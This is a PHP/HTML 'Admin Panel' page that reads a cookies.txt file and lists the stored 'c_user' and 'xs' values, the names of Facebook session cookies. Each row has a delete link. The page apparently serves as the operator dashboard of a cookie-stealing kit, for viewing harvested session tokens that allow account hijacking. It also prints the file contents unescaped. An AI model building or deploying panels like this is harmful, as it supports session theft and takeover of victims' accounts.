<!DOCTYPE html>
<html>
<head>
    <title>Dashboard</title>

    <style>
        body {
            background-color: #292c2c;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        h2{
            margin-bottom: 10px;
            opacity: .7;
        }
        center h1{
            margin-bottom: 20px;
            opacity: .9;
        }
        table {
            border-collapse: collapse;
            width: 70%;
            margin: 0 auto; /* To center the table horizontally */
            background-color: #fff;
            box-shadow: 0px 0px 20px 5px rgba(0, 0, 0, 0.3);
        }

        table, th, td {
            border: 10px solid white;
        }

        th, td {
            color: #000;
            padding: 5px 0px;
            text-align: center;
        }

        tr:nth-child(even) {
            background-color: #ddd;
        }
        center a{
            margin: 20px 0;
        }

        a{
            background-color: #ff0000;
            color: white;
            border: none;
            padding: 5px 10px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
            border-radius: 4px;
            cursor: pointer;
        }
        @media (max-width: 600px) {
            *{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body{
              padding: 10px;
              margin: 0;
              display: flex;
              align-items: center;
              justify-content: center;
              flex-direction: column;
            }
            table {
                width: 90%; /* Full width for small screens */
                margin: 0;
                padding: 0;
            }
        }

        
    </style>

</head>
<body>
    <h2>Welcome to the Admin Panel</h2>
    <center> <h1> Admin </h1> </center>
    <table border="1">
        <tr>
            <th>Serial No#</th>
            <th>c_user</th>
            <th>xs</th>
            <th>Action</th>
        </tr>
        <?php
        $lines = file('cookies.txt');
        $serial = 1;
        foreach ($lines as $line) {
            $data = explode(', ', $line);
            echo "<tr>";
            echo "<td>$serial</td>";
            foreach ($data as $item) {
                list($label, $value) = explode(': ', $item);
                echo "<td>$value</td>";
            }
            echo "<td><a  href='admin_delete.php?line=$serial'>Delete</a></td>";
            echo "</tr>";
            $serial++;
        }
        ?>
    </table>
        <center> <a href="login.php"> Logout </a> </center>
        <center> <h6>created with ❤️</h6> </center>


</body>
</html>
